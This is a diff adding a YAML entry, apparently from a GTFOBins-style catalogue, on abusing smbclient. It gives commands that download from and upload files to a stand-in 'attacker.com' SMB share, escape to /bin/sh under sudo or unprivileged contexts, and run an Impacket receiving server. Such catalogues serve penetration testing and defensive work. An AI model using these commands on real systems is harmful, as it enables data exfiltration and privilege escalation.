@@ -1,0 +1,34 @@
+---
+functions:
+  download:
+  - code: |-
+      smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
+    contexts:
+      sudo:
+      unprivileged:
+    sender:
+      code: |-
+        smbserver.py -smb2support share .
+      comment: |-
+        A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/SecureAuthCorp/impacket)).
+  shell:
+  - code: |-
+      smbclient '\\host\share'
+      !/bin/sh
+    comment: |-
+      A valid SMB/CIFS server must be available.
+    contexts:
+      sudo:
+      unprivileged:
+  upload:
+  - code: |-
+      smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
+    contexts:
+      sudo:
+      unprivileged:
+    receiver:
+      code: |-
+        smbserver.py -smb2support share .
+      comment: |-
+        A SMB/CIFS server can be used on the attacker box to receive the data (e.g, using [Impacket](https://github.com/SecureAuthCorp/impacket)).
+...
